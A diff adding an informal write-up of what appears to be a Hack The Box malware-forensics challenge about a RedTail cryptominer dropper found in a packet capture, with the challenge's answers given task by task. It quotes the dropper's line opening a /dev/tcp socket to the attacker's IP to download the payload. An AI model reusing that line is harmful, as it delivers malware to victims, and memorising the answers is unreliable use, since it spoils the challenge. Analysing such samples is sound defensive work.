@@ -1,0 +1,93 @@
+Recently, a user triggered multiple alerts after downloading several potentially unwanted applications (PUAs), prompting concern from the security team. To gain deeper insight into the user's activity, the team began monitoring network traffic from their workstation. Their objective is to assess whether the downloads are linked to more serious malware threats.
+
+
+open pcap in wireshark
+We can immediately notice an odd download, which is def the PUA. Following this, we can determine:
+- The victim IP is 192.168.1.152
+- The server/attacker host is 94.156.177.109, took some guessing but we can see the first, none gibberish GET request from this IP.
+	- The answer to task 3 is in the same packet too; the downloaded file is named sh.
+
+Task 4 is a bit iffy since GET was NOT used to download the payload? We can see that port 80 is used for communication though; between the server and victim.
+
+Note that we can export the sh script to our desktop in Wireshark. That is where Task 4 is probably referring to.
+
+We can see 'sh' is a bash script. We can also see that the FUNCTION used to download the payload is called dlr(), and that port 80 is used to open a socket connection to the attacker host at port 80: exec 3<>"/dev/tcp/94.156.177.109/80"
+
+exec 3<> will assign the connection to file descriptor 3, so any I/O or similar operations done through this file descriptor are going from the attacker host to the victim host.
+
+For task 6, we can see the line 'if cd "$i" && touch .testfile && (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || truncate -s 2M .testfile2 >/dev/null 2>&1); then' will simple create .testfile2 using dd by writing zeros to the entire file, with a block size of 2M, once. Therefore, this file is 2M in size.
+
+Task 7 is ez. The line is: ARCH=$(uname -mp), HTB wants just the uname part which is dumb.
+
+Task 8 wants the file downloaded after the ARCH checks, which is x86_64. It takes a bit to notice but the hint and the dlr() function call show that x86_64 is downloaded from the attacker's server! The file is then named '.redtail'.
+
+Task 9 appears to be requiring a different file now, since there isn't anything else to find here. We should look for the x86_64 file and other things in the packet capture now. 
+- We acquire the file just fine but it is a binary. 
+- Running strings against it, we can instantly see it is packed w/ UPX. A later task wants the version number so we'll look out for that.
+	- $Id: UPX 4.23 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $, ggs.
+
+Next step is to unpack this malware. 
+- upx -d -o x86_64_unpack x86_64
+- Works! Now run strings against it again. The output is waaaaaaaay too large lol. We will need to get the entropy for it and upload it to virustotal to check for any signatures.
+
+Returning back, we can see two other named files, 'lb' and 'clean'. The clean script probably has the mining service disable command:
+- systemctl disable c3pool_miner
+
+There is also the 'stop' command done after, which SHOULD be the answer but nah, guess not lol.
+
+We know that pestudio can get the entropy of the file, and sure enough it is shown: file > info,size: 4671408 bytes, entropy: 6.488.
+
+JK HTB wants a more precise entropy value cuz this isn't enough LOL. The entropy cli tool can help with this hopefully: https://github.com/merces/entropy/blob/master/entropy.cpp, we can build it manually w/ g++.
+- Now run it against the malware andddddddd 6.49 /home/kali/x86_64_unpack BRUH we need more precision.
+
+Grok query returns a script to return entropy w/ 8 decimal places:
+
+import math
+import sys
+from collections import Counter
+
+def calculate_file_entropy(file_path):
+    try:
+        # Read the file in binary mode
+        with open(file_path, 'rb') as file:
+            data = file.read()
+        
+        if not data:
+            return 0.0
+            
+        # Count frequency of each byte
+        byte_counts = Counter(data)
+        total_bytes = len(data)
+        
+        # Calculate entropy using Shannon's formula
+        entropy = 0.0
+        for count in byte_counts.values():
+            probability = count / total_bytes
+            entropy -= probability * math.log2(probability)
+            
+        return round(entropy, 8)
+        
+    except FileNotFoundError:
+        print(f"Error: File '{file_path}' not found")
+        return None
+    except Exception as e:
+        print(f"Error: {str(e)}")
+        return None
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Usage: python calculate_entropy.py <file_path>")
+        sys.exit(1)
+        
+    file_path = sys.argv[1]
+    entropy = calculate_file_entropy(file_path)
+    
+    if entropy is not None:
+        print(f"Entropy of {file_path}: {entropy:.8f} bits per byte")
+
+- Entropy of /home/kali/x86_64_unpack: 6.48844947 bits per byte
+- Our answer is 6.488449! Correct!
+
+Now moving on, Task 12 is ez. One of the submitted filenames is redtail.cuidado. The hint shows a period in the center of the name, so this is it!
+
+Lastly, the MITRE ID is in the Impact section, and it's Resource Hijacking; T1496!
